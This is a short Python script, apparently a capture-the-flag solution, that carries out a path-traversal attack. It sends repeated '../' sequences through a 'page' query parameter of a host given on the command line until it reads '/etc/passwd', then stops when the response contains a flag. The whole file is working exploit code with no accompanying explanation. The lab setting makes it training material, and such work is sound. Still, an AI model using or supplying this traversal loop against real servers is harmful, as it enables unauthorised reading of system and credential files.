#!/usr/bin/env python3
#by aribeiro

import requests
import urllib.request
from bs4 import BeautifulSoup
import sys

def main(arg):
	url = 'http://' + arg + '/?page='
	path = "etc/passwd"
	while 1:
		new_url = url + "../"
		req = requests.get(url + path)
		soup = BeautifulSoup(req.text, "lxml")
		script = soup.find('script')
		if "flag" in script.text:
			print('URL :\t\t' + new_url + path + '\nMESSAGE :\t' + script.text)
			break
		url = new_url

if __name__ == "__main__":
	try:
		arg = sys.argv[1]
		main(arg)
	except IndexError:
		print("=> Error: one argument is missing (ex: python3 script.py 192.168.1.59)")